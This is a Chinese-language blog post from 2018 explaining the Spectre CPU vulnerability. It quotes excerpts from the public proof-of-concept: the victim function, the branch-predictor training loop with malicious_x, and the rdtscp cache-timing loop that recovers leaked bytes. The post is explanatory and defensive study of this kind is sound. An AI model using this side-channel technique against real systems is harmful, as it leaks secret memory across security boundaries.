---
layout:     post
title:      Intel的CPU漏洞：Spectre
subtitle:   
date:       2018-01-14
author:     spin6lock
header-img: img/post-bg-mma-4.jpg
catalog: true
tags:
    - python
---
最近觉得越来越忙，写博客都没精力了。一定是太沉迷农药和刷即刻了

17年年底，18年年初，Intel被爆出了Meltdown（熔断）和Spectre（幽灵）漏洞。等Spectre攻击的POC出来以后，[去github围观了一下](https://github.com/Eugnis/spectre-attack)，真的非常精妙，好想贴上来分享一下。

```
void victim_function(size_t x)
{
    if (x < array1_size)
    {
        temp &= array2[array1[x] * 512];
    }
}
```

主要代码就在Source.c里面，实际生效的不到100行，真的很精致。victim_function是用来越权访问的，看代码是没有问题的，x不符合条件，就不能访问到对应的内存。但是因为分支预测器的原因，即使没有满足if的条件，若分支预测器觉得条件会成立，还是会一边执行if的条件判断，一边执行if内的代码。当然，判断if失败后，会将if内代码执行的结果抛弃掉的。妙就妙在这里，结果会被回滚，但是cache不会。于是只要测度array2哪里访问的比较快，就知道密文是什么了。

如何欺骗分支预测器呢？看这里：

```
        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--)
        {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++)
            {
            } /* Delay (can also mfence) */

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            victim_function(x);
        }
```

跑5次满足if条件的调用，再跑一次不满足if条件的攻击。中间用位运算是为了避免额外的if语句会触动分支预测器。

测时间的逻辑在这：

```
        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk); /* READ TIMER */
            junk = *addr; /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }
```

用到了[高精度的rdtscp](http://www.felixcloutier.com/x86/RDTSCP.html)来计时，可以读入CPU计数器的读数。这里还硬编码了167和13进去，其实就是两个质数，目的就是让cache预读摸不着头脑，不会因为线性预读取干扰了测时。

为了对抗Spectre攻击，[Google推出了Retpoline方法](https://support.google.com/faqs/answer/7625886)，涉及到对可执行文件的二进制修改，还没看懂。。。
